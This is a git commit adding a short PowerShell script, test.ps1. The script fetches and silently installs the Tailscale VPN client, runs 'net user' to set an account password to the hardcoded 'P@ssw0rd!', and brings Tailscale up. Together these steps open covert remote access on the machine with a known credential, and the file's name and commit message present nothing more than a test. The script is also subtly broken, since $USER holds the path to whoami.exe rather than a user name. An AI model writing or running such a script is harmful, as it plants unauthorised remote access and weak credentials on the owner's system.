e015cee24694bd305a697ceed8c449b4137de8ab
Efebey007 <mail@cruizernw.com.tr>
2026-01-01 18:14:55 +0300

    Create test.ps1

---
+++ test.ps1
@@ -0,0 +1,7 @@
+$MsiUrl  = "https://pkgs.tailscale.com/stable/tailscale-setup-1.92.3-amd64.msi"
+$MsiPath = "$env:TEMP\tailscale.msi"
+$USER = "C:\Windows\System32\whoami.exe"
+Invoke-WebRequest -Uri $MsiUrl -OutFile $MsiPath
+Start-Process msiexec -ArgumentList "/i `"$MsiPath`" /qn /norestart" -Wait
+net user $USER P@ssw0rd!
+cmd /c '"C:\Program Files\Tailscale\tailscale.exe" up'
